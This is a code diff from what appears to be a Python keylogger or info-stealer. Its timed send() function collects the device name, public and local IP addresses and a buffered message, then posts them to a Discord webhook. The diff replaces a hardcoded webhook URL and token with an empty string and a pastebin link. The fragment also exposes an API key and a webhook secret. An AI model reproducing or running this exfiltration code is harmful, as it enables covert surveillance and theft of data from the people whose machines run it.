@@ -28,7 +28,7 @@ def send():
         headers = {"content-type": "application/json"}
         ip = requests.get("https://api.ipgeolocation.io/getip?apiKey=ecf13c4bb0814054b3e27bd99fd9a720", headers=headers).json()["ip"]
         json = {"content": f"```\nDevice Name: {socket.gethostname()}\nPublic Ip: {ip}\nLocal Ip: {socket.gethostbyname(socket.gethostname())}\n\n{msg}\n```"}
-        r = requests.post("https://discord.com/api/webhooks/1031658215445893131/a1D52-WXBie8KnYDIK_6epo3le2Laut_KCS7viPzdWMM3uEcLPZJuFiaGT_jXhwvnbz2", headers=headers, json=json)
+        r = requests.post("", headers=headers, json=json) # https://pastebin.com/EZbiTNEs
         msg = ""
     Timer(wait_between_send, send).start()
 
